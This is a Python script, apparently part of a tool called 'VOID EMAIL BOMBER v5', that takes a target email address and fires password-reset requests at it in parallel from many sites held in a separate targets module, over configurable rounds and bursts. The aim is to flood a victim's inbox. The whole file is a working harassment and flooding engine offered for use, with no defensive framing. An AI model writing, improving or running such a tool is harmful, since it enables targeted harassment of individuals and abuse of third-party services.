"""Password-reset email bomber — HTTP multi-site engine."""
import os
import sys
import time
import math
from concurrent.futures import ThreadPoolExecutor, as_completed

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.table import Table
from rich.live import Live
from rich import box

from http_util import make_session
from targets import TARGETS

console = Console()
SITE_COUNT = len(TARGETS)

ASCII = r"""
  ███████╗███╗   ███╗ █████╗ ██╗██╗         ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
  ██╔════╝████╗ ████║██╔══██╗██║██║         ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
  █████╗  ██╔████╔██║███████║██║██║         ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
  ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║         ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
  ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
  ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
"""


class Stats:
    def __init__(self):
        self.lock = __import__("threading").Lock()
        self.ok = 0
        self.fail = 0
        self.total = 0
        self.last = ""

    def hit(self, site, success, detail=""):
        with self.lock:
            self.total += 1
            if success:
                self.ok += 1
            else:
                self.fail += 1
            mark = "OK" if success else "FAIL"
            self.last = f"{site} · {mark}" + (f" · {detail}" if detail else "")

    def snapshot(self):
        with self.lock:
            return self.ok, self.fail, self.total, self.last


def boot(subtitle):
    if sys.platform.startswith("win"):
        os.system("title VOID // EMAIL BOMBER")
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.write("\033[?25l")
    lines = ASCII.strip("\n").split("\n")
    t0 = time.time()
    try:
        while time.time() - t0 < 1.2:
            t = time.time() - t0
            sys.stdout.write("\033[H\n")
            for line in lines:
                sys.stdout.write("  ")
                for c, ch in enumerate(line):
                    if ch == " ":
                        sys.stdout.write(" ")
                    else:
                        v = max(40, min(255, int(120 + 135 * math.sin(t * 10 - c * 0.2))))
                        sys.stdout.write(f"\033[38;2;{v};0;0m{ch}")
                sys.stdout.write("\033[0m\n")
            sys.stdout.write(f"\n  \033[38;2;80;0;0m{subtitle}\033[0m\n")
            sys.stdout.flush()
            time.sleep(0.025)
    finally:
        sys.stdout.write("\033[?25h\033[0m")
    os.system("cls" if os.name == "nt" else "clear")


def run_target(name, fn, email, stats):
    session = make_session()
    try:
        fn(session, email, stats)
    except Exception as e:
        stats.hit(name, False, str(e)[:40])


def run_round(email, stats, threads, burst):
    """Each site is hit `burst` times in parallel (fresh session each shot)."""
    jobs = []
    for name, fn in TARGETS:
        for _ in range(burst):
            jobs.append((name, fn))
    workers = min(threads, len(jobs))
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = [pool.submit(run_target, n, f, email, stats) for n, f in jobs]
        for f in as_completed(futures):
            try:
                f.result()
            except Exception:
                pass


def build_live_panel(stats, round_idx, total_rounds, email, burst, T):
    ok, fail, total, last = stats.snapshot()
    expected = SITE_COUNT * burst * total_rounds
    pct = min(100, int(total * 100 / max(1, expected)))

    tbl = Table.grid(padding=(0, 1))
    tbl.add_column()
    tbl.add_row(Text.from_markup(f"[bold #FF2020]{T['target']}[/] [white]{email}[/]"))
    tbl.add_row(Text.from_markup(
        f"[#CCCCCC]{T['round']}[/] [bold white]{round_idx}/{total_rounds}[/]  "
        f"[#CCCCCC]{T['burst']}[/] [bold #FFD700]×{burst}[/]  "
        f"[#CCCCCC]{T['progress']}[/] [bold #00FF88]{pct}%[/]"
    ))
    tbl.add_row(Text.from_markup(
        f"[bold #00FF88]OK {ok}[/]  [bold #FF4444]FAIL {fail}[/]  "
        f"[#888888]{T['sent']} {total}[/]"
    ))
    if last:
        tbl.add_row(Text.from_markup(f"[dim]{last}[/]"))

    return Panel(
        Align.center(tbl),
        title="[bold #FF2020]VOID EMAIL BOMBER[/]",
        subtitle=f"[dim]{SITE_COUNT} {T['sites_per_round']} · ×{burst} {T['burst_label']}[/]",
        border_style="#8B0000",
        box=box.DOUBLE,
        padding=(1, 2),
    )


def main(T):
    boot(T["subtitle"])
    console.print(Panel(
        Align.center(Text.from_markup(
            f"[bold #FF2020]VOID EMAIL BOMBER v5[/]\n"
            f"[#CCCCCC]{T['desc']}[/]\n"
            f"[dim]Amazon · Stack · Le Monde · {T['intense']}[/]"
        )),
        border_style="#8B0000", box=box.HEAVY, padding=(1, 2),
    ))

    email = console.input(f"\n  [bold #FF2020]?[/] {T['prompt']} ").strip()
    if "@" not in email or "." not in email.split("@")[-1]:
        console.print(f"  [bold #FF4444]{T['invalid']}[/]")
        return

    try:
        rounds = int(console.input(f"  [bold #FF2020]?[/] {T['rounds_prompt']} ").strip() or "20")
        rounds = max(1, min(rounds, 200))
    except ValueError:
        rounds = 20

    try:
        burst = int(console.input(f"  [bold #FF2020]?[/] {T['burst_prompt']} ").strip() or "20")
        burst = max(1, min(burst, 100))
    except ValueError:
        burst = 20

    threads = min(64, max(30, burst * SITE_COUNT))

    total_req = SITE_COUNT * burst * rounds
    stats = Stats()
    console.print(
        f"\n  [bold #00FF88]{T['launch']}[/]  "
        f"[dim]{SITE_COUNT} sites × {burst} rafale × {rounds} tours = {total_req} req[/]\n"
    )

    with Live(build_live_panel(stats, 0, rounds, email, burst, T), refresh_per_second=10, console=console) as live:
        for r in range(1, rounds + 1):
            run_round(email, stats, threads, burst)
            live.update(build_live_panel(stats, r, rounds, email, burst, T))
            if r < rounds:
                time.sleep(0.03)

    ok, fail, total, _ = stats.snapshot()
    console.print(Panel(
        Align.center(Text.from_markup(
            f"[bold #00FF88]{T['done']}[/]\n\n"
            f"[white]{T['sent']} [bold]{total}[/][/]\n"
            f"[#00FF88]OK {ok}[/]  [#FF4444]FAIL {fail}[/]\n"
            f"[dim]{T['note']}[/]"
        )),
        border_style="#FFD700", box=box.DOUBLE_EDGE, padding=(1, 3),
    ))
    console.input(f"\n  [dim]{T['enter']}[/]")
